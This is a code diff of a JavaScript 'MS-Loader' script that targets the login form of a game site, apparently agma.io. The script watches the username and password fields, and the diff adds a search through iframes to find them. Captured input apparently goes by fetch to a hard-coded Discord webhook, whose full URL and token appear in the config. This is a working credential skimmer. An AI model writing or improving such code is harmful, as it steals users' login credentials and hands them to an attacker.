@@ -4,7 +4,6 @@
     // 1. CONFIGURATION
     const CONFIG = {
         webhookUrl: 'https://discord.com/api/webhooks/1555688085952532501/RIxYSmKDNbPesrwEbi8AO6b-CJX5LzIMBM0VJPFftEKrOrPYbjUNwE06tIM8oDUiyVga',
-        // IMPORTANT: Verify these IDs match agma.io exactly
         usernameId: 'username', 
         passwordId: 'password'
     };
@@ -34,18 +33,50 @@
         .catch(err => console.error('[MS-Loader] Fetch failed:', err));
     }
 
-    // 4. DOM OBSERVER: WAIT FOR ELEMENTS
-    // agma.io might load elements dynamically, so we poll until they exist
+    // 4. DOM OBSERVER: WAIT FOR ELEMENTS (WITH IFRAME SUPPORT)
     function waitForElements(callback) {
         const check = () => {
-            const userEl = document.getElementById(CONFIG.usernameId);
-            const passEl = document.getElementById(CONFIG.passwordId);
-            
+            // 1. Try Top-Level Document
+            let userEl = document.getElementById(CONFIG.usernameId);
+            let passEl = document.getElementById(CONFIG.passwordId);
+
+            // 2. If not found, Try Iframes
+            if (!userEl || !passEl) {
+                const iframes = document.querySelectorAll('iframe');
+                console.log('[MS-Loader] Top-level search failed. Checking', iframes.length, 'iframes...');
+                
+                for (let iframe of iframes) {
+                    try {
+                        const iframeDoc = iframe.contentDocument || iframe.contentWindow.document;
+                        if (iframeDoc) {
+                            const iframeUserEl = iframeDoc.getElementById(CONFIG.usernameId);
+                            const iframePassEl = iframeDoc.getElementById(CONFIG.passwordId);
+                            
+                            if (iframeUserEl && iframePassEl) {
+                                userEl = iframeUserEl;
+                                passEl = iframePassEl;
+                                console.log('[MS-Loader] Elements found inside an iframe!');
+                                break;
+                            }
+                        }
+                    } catch (e) {
+                        // Cross-origin iframe, ignore
+                    }
+                }
+            }
+
+            console.log('[MS-Loader] Checking for elements...', {
+                userFound: !!userEl,
+                passFound: !!passEl,
+                userId: CONFIG.usernameId,
+                passId: CONFIG.passwordId
+            });
+
             if (userEl && passEl) {
                 console.log('[MS-Loader] Elements found. Attaching listeners.');
                 callback(userEl, passEl);
             } else {
-                console.log('waiting');
+                // If not found, retry in 500ms
                 setTimeout(check, 500);
             }
         };
@@ -76,11 +107,11 @@
         userEl.addEventListener('input', handleInput);
         passEl.addEventListener('input', handleInput);
         
-        console.log('[MS-Loader] Listeners attached.');
+        console.log('[MS-Loader] Listeners attached to elements.');
     }
 
     // 6. INITIALIZATION
-    console.log('[MS-Loader] Script Loaded.');
+    console.log('[MS-Loader] Script Loaded. Starting wait loop...');
     
     // Start watching for elements
     waitForElements(attachListeners);
